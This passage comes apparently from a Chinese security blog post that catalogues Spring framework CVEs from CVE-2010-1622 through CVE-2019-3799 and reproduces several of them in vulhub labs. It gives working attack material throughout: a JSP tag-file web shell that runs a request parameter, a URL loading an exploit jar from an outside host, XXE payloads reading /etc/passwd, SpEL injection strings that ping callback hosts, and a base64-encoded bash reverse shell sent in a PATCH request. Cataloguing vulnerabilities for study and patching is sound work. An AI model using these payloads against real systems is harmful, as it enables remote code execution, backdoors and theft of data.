META-INF/tags/中的标签文件，包含有标签定义（任意Java代码）</span><br></pre></td></tr></table></figure><p>/META-INF/spring-form.tld文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;form:input/&gt; tag --&gt;    </span><br><span class="line">&lt;tag-file&gt;    </span><br><span class="line">&lt;name&gt;input&lt;/name&gt;    </span><br><span class="line">&lt;path&gt;/META-INF/tags/InputTag.tag&lt;/path&gt;  </span><br><span class="line">&lt;/tag-file&gt;</span><br></pre></td></tr></table></figure><p>/META-INF/tags/InputTag.tag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;</span><br><span class="line">&lt;% </span><br><span class="line">j java.lang.Runtime.getRuntime().exec(&quot;mkdir /tmp/PWNED&quot;); </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>做出这样的替换后，当开发者在controller中将任何一个对象绑定表单，并且最终展示的jsp内容有下面这些：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=&quot;form&quot; uri=&quot;http://www.springframework.org/tags/form&quot;%&gt;  </span><br><span class="line">&lt;form:form commandName=&quot;user&quot;&gt;</span><br><span class="line">&lt;form:input path=&quot;name&quot;/&gt;</span><br><span class="line">&lt;/form:form&gt;</span><br></pre></td></tr></table></figure><p>攻击者访问url,即可触发远程代码执行的效果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://inbreak.net/springmvc/testjsp.htm? class.classLoader.URLs[0]=jar:https://inbreak.net/spring-exploit.jar!/</span><br></pre></td></tr></table></figure><p>如果服务器大于tomcat6.0.28版本，这样做会把所有的input标签替换掉，导致不能正常显示。需要修改</p><p>spring-form.tld，给其中的inputtag改名，name改为inputkxlzx：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;tag&gt;        </span><br><span class="line">&lt;name&gt;inputkxlzx&lt;/name&gt;  //什么名字都行</span><br></pre></td></tr></table></figure><p>在文件中新加入一个tag，叫做input：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;tag-file&gt;    </span><br><span class="line">&lt;name&gt;input&lt;/name&gt;    </span><br><span class="line">&lt;path&gt;/WEB-INF/tags/InputTag.tag&lt;/path&gt;  </span><br><span class="line">&lt;/tag-file&gt;</span><br></pre></td></tr></table></figure><p>InputTag.tag的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ tag dynamic-attributes=&quot;dynattrs&quot; %&gt;</span><br><span class="line">&lt;%if (request.getParameter(&quot;kxlzxcmd&quot;)!=null)     </span><br><span class="line">exec(request.getParameter(&quot;kxlzxcmd&quot;)); </span><br><span class="line">%&gt;</span><br><span class="line">&lt;form:inputkxlzx path=&quot;$&#123;dynattrs.path&#125;&quot;&gt;&lt;/form:inputkxlzx&gt;</span><br></pre></td></tr></table></figure><p>访问的时候需要在参数中携带kxlzxcmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.htm?name=kxlzx&amp;kxlzxcmd=calc   //包含input的页面</span><br></pre></td></tr></table></figure><p><a href="http://blog.o0o.nu/2010/06/cve-2010-1622.html" target="_blank" rel="noopener">http://blog.o0o.nu/2010/06/cve-2010-1622.html</a></p><p><a href="https://www.inbreak.net/archives/377" target="_blank" rel="noopener">https://www.inbreak.net/archives/377</a></p><h2 id="0x01-CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入"><a href="#0x01-CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入" class="headerlink" title="0x01 CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入"></a>0x01 CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入</h2><blockquote><p>影响版本：3.0.0至3.2.3、4.0.0.M1</p></blockquote><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   </span><br><span class="line">&lt;username&gt;John&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure><p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [   </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   </span><br><span class="line">&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h2 id="0x02-CVE-2013-7315-Spring-Framework中的XML外部实体"><a href="#0x02-CVE-2013-7315-Spring-Framework中的XML外部实体" class="headerlink" title="0x02 CVE-2013-7315 Spring Framework中的XML外部实体"></a>0x02 CVE-2013-7315 Spring Framework中的XML外部实体</h2><blockquote><p>影响版本：3.2.0至3.2.3、4.0.0.M1-4.0.0.M2（Spring MVC）</p></blockquote><p>由于对 <strong>CVE-2013-4152</strong>和<strong>CVE-2013-6429的</strong>修复不完整导致。</p><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   </span><br><span class="line">&lt;username&gt;John&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure><p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [   </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   </span><br><span class="line">&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h2 id="0x03-CVE-2014-3527-Spring-Security验证绕过漏洞"><a href="#0x03-CVE-2014-3527-Spring-Security验证绕过漏洞" class="headerlink" title="0x03 CVE-2014-3527 Spring Security验证绕过漏洞"></a>0x03 CVE-2014-3527 Spring Security验证绕过漏洞</h2><blockquote><p>影响版本：SpringSource Spring Security 3.1-3.2.4</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当使用从Spring Security 3.1到3.2.4的CAS代理票证身份验证时，恶意的CAS服务可能会欺骗另一个CAS服务来认证未关联的代理票证。这是由于以下事实：代理票证身份验证使用了来自HttpServletRequest的信息，该信息是根据HTTP请求中的不可信信息填充的。这意味着，如果存在CAS服务可以相互认证的访问控制限制，则可以绕过这些限制。如果用户未使用CAS代理票证，并且未基于CAS服务做出访问控制决策，则对用户没有影响。</span><br></pre></td></tr></table></figure><h2 id="0x04-CVE-2014-0097-Spring-Security认证绕过"><a href="#0x04-CVE-2014-0097-Spring-Security认证绕过" class="headerlink" title="0x04 CVE-2014-0097 Spring Security认证绕过"></a>0x04 CVE-2014-0097 Spring Security认证绕过</h2><blockquote><p>影响版本：Spring Security 3.2.0至3.2.1和3.1.0至3.1.5</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectoryLdapAuthenticator不检查密码长度。如果目录允许匿名绑定，则它可能会错误地验证提供空密码的用户。</span><br></pre></td></tr></table></figure><h2 id="0x05-CVE-2014-3578-Spring-Framework-目录遍历漏洞"><a href="#0x05-CVE-2014-3578-Spring-Framework-目录遍历漏洞" class="headerlink" title="0x05 CVE-2014-3578 Spring Framework 目录遍历漏洞"></a>0x05 CVE-2014-3578 Spring Framework 目录遍历漏洞</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Framework:</span><br><span class="line">- 3.0.4 to 3.2.11</span><br><span class="line">- 4.0.0 to 4.0.7</span><br><span class="line">- 4.1.0 to 4.1.1</span><br></pre></td></tr></table></figure><p>在web.xml存在如下情况下存在目录遍历：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;mvc:resources mapping=&quot;/css/**&quot; location=&quot;file:webapps/springapp/WEB-INF/classes/theme/css/&quot; /&gt;</span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /springapp/css/file:/etc/passwd</span><br></pre></td></tr></table></figure><h2 id="0x06-CVE-2016-2173-Spring-AMQP中的远程代码执行"><a href="#0x06-CVE-2016-2173-Spring-AMQP中的远程代码执行" class="headerlink" title="0x06 CVE-2016-2173 Spring AMQP中的远程代码执行"></a>0x06 CVE-2016-2173 Spring AMQP中的远程代码执行</h2><p>影响版本：1.0.0至1.5.4</p><p><a href="https://github.com/HaToan/CVE-2016-2173" target="_blank" rel="noopener">https://github.com/HaToan/CVE-2016-2173</a></p><p>使用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- ysoserial-0.0.4-all.jar create payload write and execute a shell    </span><br><span class="line">+ java -jar ysoserial-0.0.4-all.jar &apos;library_vul&apos; &apos;command&apos;</span><br><span class="line"></span><br><span class="line">- exploit-cve2016-2173.jar : send to App vul    </span><br><span class="line">+ java -jar exploit-cve2016-2173.jar</span><br></pre></td></tr></table></figure><p>本来想根据配置来搭一个环境处理，结果环境一直搭不起来，构建各种失败，就先放这个利用poc把。</p><h2 id="0x07-CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞"><a href="#0x07-CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞" class="headerlink" title="0x07 CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞"></a>0x07 CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞</h2><p>影响版本：2.0.0-2.0.9、1.0.0-1.0.5</p><p><a href="https://www.seebug.org/vuldb/ssvid-92474" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92474</a></p><p>漏洞利用POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;2334-1&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/1.png" alt></p><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://207.246.79.196:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;T(java.lang.Runtime).getRuntime().exec(%22ping%20xxx.ceye.io%22)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/2.png" alt></p><p>但是此命令执行，不会在页面上显示，只会打印出运行的对象。</p><p>如果要执行反弹shell等命令，由于页面HTML编码的原因，SPEL返回值时进行了一次html编码，所以导致取出的 值时会进行一次转义，利用如下脚本加工。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">message = input(&apos;Enter message to encode:&apos;)</span><br><span class="line"></span><br><span class="line">print(&apos;Decoded string (in ASCII):\n&apos;)</span><br><span class="line">print(&apos;T(java.lang.Character).toString(%s)&apos; % ord(message[0]), end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:   </span><br><span class="line">print(&apos;.concat(T(java.lang.Character).toString(%s))&apos; % ord(ch), end=&quot;&quot;), </span><br><span class="line">print(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">print(&apos;new java.lang.String(new byte[]&#123;&apos;, end=&quot;&quot;),</span><br><span class="line">print(ord(message[0]), end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:   </span><br><span class="line">print(&apos;,%s&apos; % ord(ch), end=&quot;&quot;), </span><br><span class="line">print(&apos;)&#125;&apos;)</span><br></pre></td></tr></table></figure><p>执行输出后再添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(payload)</span><br></pre></td></tr></table></figure><h2 id="0x08-CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞"><a href="#0x08-CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞" class="headerlink" title="0x08 CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞"></a>0x08 CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞</h2><blockquote><p>影响版本：1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p></blockquote><p><a href="https://www.cnblogs.com/litlife/p/10183137.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/10183137.html</a></p><p>下载存在漏洞的版本1.3.0：<a href="https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip</a></p><p>POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?payload=$&#123;new%20java.lang.String(new%20byte[]&#123;70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66&#125;)&#125;结果：FBB204A4061FFBD41284A84C258C1BFB返回结果是md5(wooyun)</span><br></pre></td></tr></table></figure><h2 id="0x09-CVE-2016-6652-Spring-Data-JPA-SQL盲注"><a href="#0x09-CVE-2016-6652-Spring-Data-JPA-SQL盲注" class="headerlink" title="0x09 CVE-2016-6652 Spring Data JPA SQL盲注"></a>0x09 CVE-2016-6652 Spring Data JPA SQL盲注</h2><p>影响版本：Spring Data JPA 1.10.2、1.9.4</p><p><a href="https://www.seebug.org/vuldb/ssvid-92534" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92534</a></p><h2 id="0x10-CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞"><a href="#0x10-CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞" class="headerlink" title="0x10 CVE-2017-4971 Spring WebFlow 远程代码执行漏洞"></a>0x10 CVE-2017-4971 Spring WebFlow 远程代码执行漏洞</h2><blockquote><p>影响版本：Spring Web Flow 2.4.0 to 2.4.4</p></blockquote><p>使用vulhub搭建环境后，在添加poc执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;_(new+java.lang.ProcessBuilder(&quot;ping&quot;,&quot;xxx.ceye.io&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/3.png" alt></p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/4.png" alt></p><p>无害化payload检测，如果 response header 中出现 vulnerable 头，则有漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/5.png" alt></p><h2 id="0x11-CVE-2017-8045-Spring-Amqp中的远程代码执行"><a href="#0x11-CVE-2017-8045-Spring-Amqp中的远程代码执行" class="headerlink" title="0x11 CVE-2017-8045 Spring Amqp中的远程代码执行"></a>0x11 CVE-2017-8045 Spring Amqp中的远程代码执行</h2><blockquote><p>影响版本：1.7.4、1.6.11和1.5.7之前的Spring AMQP版本</p></blockquote><p><a href="https://xz.aliyun.com/t/36" target="_blank" rel="noopener">https://xz.aliyun.com/t/36</a></p><h2 id="0x12-CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码"><a href="#0x12-CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码" class="headerlink" title="0x12 CVE-2017-8046 Spring Data REST PATCH请求远程执行代码"></a>0x12 CVE-2017-8046 Spring Data REST PATCH请求远程执行代码</h2><blockquote><p>影响版本：Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本、Spring Data release trains Kay-RC3之前的版本、Spring Boot 2.0.0M4之前的版本</p></blockquote><p><a href="https://www.cnblogs.com/co10rway/p/9380441.html" target="_blank" rel="noopener">https://www.cnblogs.com/co10rway/p/9380441.html</a></p><p>利用POC执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&apos;ping xxx.ceye.io&apos;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></pre></td></tr></table></figure><p>反弹shell，其中反弹shell命令需要借助编码来减少重定向出错的问题<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">java.lang.Runtime.exec() Payload Workarounds</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&apos;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzg4OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&apos;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/6.png" alt></p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/7.png" alt></p><h2 id="0x13-CVE-2018-1258-Spring-Security未经授权的访问"><a href="#0x13-CVE-2018-1258-Spring-Security未经授权的访问" class="headerlink" title="0x13 CVE-2018-1258 Spring Security未经授权的访问"></a>0x13 CVE-2018-1258 Spring Security未经授权的访问</h2><blockquote><p>影响版本：Spring Framework 5.0.5.RELEASE和Spring Security（任何版本）</p></blockquote><p>暂无详细信息</p><h2 id="0x14-CVE-2018-1259-具有XMLBeam的Spring-DataXXE"><a href="#0x14-CVE-2018-1259-具有XMLBeam的Spring-DataXXE" class="headerlink" title="0x14 CVE-2018-1259 具有XMLBeam的Spring DataXXE"></a>0x14 CVE-2018-1259 具有XMLBeam的Spring DataXXE</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XMLBeam 1.4.14或更早版本结合使用的Spring Data Commons</span><br><span class="line">Spring Data Commons 1.13至1.13.11（Ingalls SR11）</span><br><span class="line">Spring Data REST 2.6至2.6.11（Ingalls SR11）</span><br><span class="line">Spring Data Commons 2.0至2.0.6（Kay SR6）</span><br><span class="line">Spring Data REST 3.0至3.0.6（Kay SR6）</span><br></pre></td></tr></table></figure><p><a href="http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/</a></p><p><a href="https://xz.aliyun.com/t/2341" target="_blank" rel="noopener">https://xz.aliyun.com/t/2341</a></p><h2 id="0x15-CVE-2018-1270-Spring-Messaging远程代码执行漏洞"><a href="#0x15-CVE-2018-1270-Spring-Messaging远程代码执行漏洞" class="headerlink" title="0x15 CVE-2018-1270 Spring Messaging远程代码执行漏洞"></a>0x15 CVE-2018-1270 Spring Messaging远程代码执行漏洞</h2><blockquote><p>影响版本：Spring Framework 5.0 to 5.0.4。Spring Framework 4.3 to 4.3.14</p></blockquote><p>同样利用vulhub搭建环境，首先我们先拦截connect，查看通过的ws包，点击后会有这么一个请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws://x.x.x.x:8080/gs-guide-websocket/845/beqcexeb/websocket</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/8.png" alt></p><p>从bp中看到来回四个包，其中的内容为如上所示，修改如下请求包</p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/9.png" alt></p><p>在发送任意消息，即可触发</p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/10.png" alt></p><p>或者尝试使用vulhub提供的脚本，但是此脚本并不具备通用性，需要修改使用<a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py" target="_blank" rel="noopener">poc</a></p><h2 id="0x16-CVE-2018-1271-Spring-MVC-目录穿越漏洞"><a href="#0x16-CVE-2018-1271-Spring-MVC-目录穿越漏洞" class="headerlink" title="0x16 CVE-2018-1271 Spring MVC 目录穿越漏洞"></a>0x16 CVE-2018-1271 Spring MVC 目录穿越漏洞</h2><p>当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。</p><p>此漏洞触发条件较高：</p><ol><li>Server运行于Windows系统上</li><li>从文件系统提供的文件服务（比如使用file协议，但不是file open）</li><li>没有使用CVE-2018-1199漏洞的补丁</li><li>不使用Tomcat或者是WildFly做Server</li></ol><p>漏洞利用和复现:</p><p><a href="https://blog.knownsec.com/2018/08/spring-mvc-目录穿越漏洞cve-2018-1271分析/" target="_blank" rel="noopener">https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/</a></p><h2 id="0x17-CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞"><a href="#0x17-CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞" class="headerlink" title="0x17 CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞"></a>0x17 CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)</span><br><span class="line">Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</span><br><span class="line">Spring Data Commons 2.0 to 2.0.5 (Kay SR5)</span><br><span class="line">Spring Data REST 3.0 - 3.0.5 (Kay SR5)</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/hac425/p/9656747.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9656747.html</a></p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/11.png" alt></p><p>POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=xxxusername[T(java.lang.Runtime).getRuntime().exec(&quot;ping+xxx.ceye.io&quot;)]=test</span><br></pre></td></tr></table></figure><h2 id="0x18-CVE-2018-1260-Spring-Security-Oauth2-远程代码执行"><a href="#0x18-CVE-2018-1260-Spring-Security-Oauth2-远程代码执行" class="headerlink" title="0x18 CVE-2018-1260 Spring Security Oauth2 远程代码执行"></a>0x18 CVE-2018-1260 Spring Security Oauth2 远程代码执行</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3 to 2.3.2</span><br><span class="line">Spring Security OAuth 2.2 to 2.2.1</span><br><span class="line">Spring Security OAuth 2.1 to 2.1.1</span><br><span class="line">Spring Security OAuth 2.0 to 2.0.14</span><br></pre></td></tr></table></figure><p><a href="https://www.seebug.org/vuldb/ssvid-97287" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97287</a></p><p>此漏洞和CVE-2016-4977类似</p><p>POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.baidu.com&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22ping%20r9rub4.ceye.io%22%29%7D</span><br></pre></td></tr></table></figure><h2 id="0x19-CVE-2018-15758-spring-security-oauth2权限提升"><a href="#0x19-CVE-2018-15758-spring-security-oauth2权限提升" class="headerlink" title="0x19 CVE-2018-15758 spring-security-oauth2权限提升"></a>0x19 CVE-2018-15758 spring-security-oauth2权限提升</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3至2.3.3</span><br><span class="line">Spring Security OAuth 2.2至2.2.2</span><br><span class="line">Spring Security OAuth 2.1至2.1.2</span><br><span class="line">Spring Security OAuth 2.0到2.0.15</span><br></pre></td></tr></table></figure><p>使用了EnableResourceServer并且用了<code>AuthorizationRequest</code>的话。那么攻击者可以重新发送一次用过的验证请求，或者进行相应参数修改，从而造成权限提升。</p><p>例如劫持code，并且篡改其中的scope到all的话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://127.0.0.1&amp;scope=openid</span><br></pre></td></tr></table></figure><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/12.png" alt></p><p>即授权了读取权限的时候，修改为all就可以获得全部权限。</p><h2 id="0x20-CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历"><a href="#0x20-CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历" class="headerlink" title="0x20 CVE-2019-3799 Spring Cloud Config Server: 目录遍历"></a>0x20 CVE-2019-3799 Spring Cloud Config Server: 